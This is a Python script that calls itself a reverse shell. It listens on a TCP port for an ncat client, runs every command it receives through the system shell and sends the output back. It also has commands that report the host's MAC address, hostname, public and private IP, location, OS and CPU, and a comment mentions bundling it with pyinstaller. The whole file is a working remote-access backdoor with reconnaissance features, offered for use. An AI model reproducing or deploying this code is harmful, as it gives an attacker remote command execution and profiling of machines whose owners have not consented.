# ncat localhost 2843

import socket
import subprocess
import os
import uuid
import urllib.request
import json
import platform


class Info:
    def __init__(self):
        pass

    def internalIP(self):
        internal_ip = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        internal_ip.connect(('google.com', 0))
        return internal_ip.getsockname()[0]

    def externalIP(self):
        public_ip = urllib.request.urlopen('https://ipinfo.io/').read().decode('utf8')
        return json.loads(public_ip)['ip']

    @property  # so you don't need to call it like 'mac()'
    def mac(self):
        try:
            hostname = socket.getfqdn(socket.gethostname()).strip()
            return uuid.UUID(int=uuid.getnode()).hex[-12:]
        except:
            return 'null'

    @property
    def hostname(self):
        try:
            hostname = socket.getfqdn(socket.gethostname()).strip()
            return hostname
        except:
            return 'null'

    @property
    def ip(self):
        try:
            # the 'requests' library does not work very well with pyinstaller
            public_ip = self.externalIP()
            private_ip = self.internalIP()
            return f'Public IP: {public_ip}\nPrivate IP: {private_ip}'
        except:
            return 'null'

    @property
    def location(self):
        try:
            data = urllib.request.urlopen('https://ipinfo.io/').read().decode('utf8')
            country = json.loads(data)['country']
            city = json.loads(data)['region']
            return f'location: {country}/{city}'
        except:
            return 'null'

    @property
    def machine(self):
        try:
            return platform.system()
        except:
            return 'null'

    @property
    def core(self):
        try:
            return platform.machine()
        except:
            return 'null'


class Helper:
    def __init__(self):
        pass

    @property
    def general(self):
        return 'This script allows you to run normal shell commands as well as some custom commands, ' \
               'type `!help.info` to get more information about it. '

    @property
    def info(self):
        msg = 'The info command gives you information about the system\n\n'
        msg += 'info.mac: MAC address\n'
        msg += 'info.hostname: name assigned to this device in this network\n'
        msg += 'info.ip: private and public ip address\n'
        msg += 'info.location: country/city\n'
        msg += 'info.machine: OS\n'
        msg += 'info.core: CPU'
        return msg


class ReverseShell:
    HOST = 'localhost'
    PORT = 2843
    BUFF_SIZE = 2048

    def __init__(self):
        self.isAlive = True
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM, socket.IPPROTO_TCP)  # TCP socket
        self.s.bind((self.HOST, self.PORT))  # bind it to the address we have specified above
        self.s.listen()  # listen for connections
        print(f'listening on {self.HOST}:{self.PORT}')
        self.client_socket, self.client_address = self.s.accept()
        print(f'Accepted connection: {self.client_address[0]}:{self.client_address[1]}')

    def send_msg(self, msg):
        msg = bytes(f'{msg}\n\n:> ', 'utf8')  # str into utf8 bytes conversion
        send = self.client_socket.sendall(msg)
        return send

    def receive_msg(self):
        receive = self.client_socket.recv(self.BUFF_SIZE)
        return receive

    def hq(self, msg):
        try:
            if msg == 'destroy':
                self.client_socket.close()  # close the client socket
                print('client connection closed')
                self.isAlive = False

            elif msg[:5] == 'info.':
                info = Info()
                if len(msg) > 5:
                    if msg[:12] == 'info.machine':
                        self.send_msg(info.machine)

                    elif msg[:13] == 'info.hostname':
                        self.send_msg(info.hostname)

                    elif msg[:7] == 'info.ip':
                        self.send_msg(info.ip)

                    elif msg[:13] == 'info.location':
                        self.send_msg(info.location)

                    elif msg[:8] == 'info.mac':
                        self.send_msg(info.mac)

                    elif msg[:9] == 'info.core':
                        self.send_msg(info.core)

                else:
                    helper = Helper()
                    self.send_msg(helper.info)

            elif msg[:5] == '!help':
                helper = Helper()
                if len(msg) > 5 and msg[6:] != '':
                    if msg[6:] == 'info':
                        self.send_msg(helper.info)
                else:
                    self.send_msg(helper.general)

            else:
                # Normal terminal commands
                tsk = subprocess.Popen(args=msg, shell=True, stdin=subprocess.PIPE,
                                       stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
                stdout, stderr = tsk.communicate()
                result = stdout.decode('utf8')  # stdout result decoded in utf8
                if msg[:2] == 'cd':  # change directory functionality added
                    os.chdir(msg[3:])
                    self.send_msg(f'*directory changed* "{os.getcwd()}"\n')

                elif msg[:4] == 'exit':
                    self.client_socket.close()  # close the client socket
                    print('client connection closed')
                    self.socketInit()  # listens for a new connection again

                else:
                    self.send_msg(result)  # sends stdout

        except Exception as e:
            self.send_msg(f'Error executing the operation:\n{e}')

    def socketInit(self):
        # will wait until it receives a new connection, and then jump to main()
        print(f'listening on {self.HOST}:{self.PORT}')
        self.client_socket, self.client_address = self.s.accept()
        print(f'Accepted connection: {self.client_address[0]}:{self.client_address[1]}')
        self.main()

    def main(self):
        if self.send_msg('\\o/ You have connected\nType !help to get more information about this script\nType `exit` '
                         'or press `ctrl + c` to close client connection\nType `destroy` to stop the script') is not \
                None:
            print('Error :(')

        while self.isAlive:
            try:
                msg = ''
                chunk = self.receive_msg()
                msg += chunk.strip().decode('utf8')
                # print(msg)  # prints the msg you have sent through ncat
                self.hq(msg)  # hq for commands, functions, etc using received msg

            except:  # just if the app crashes and can't exit properly
                self.client_socket.close()
                print('client connection closed')
                self.socketInit()


if __name__ == '__main__':
    revShell = ReverseShell()
    revShell.main()
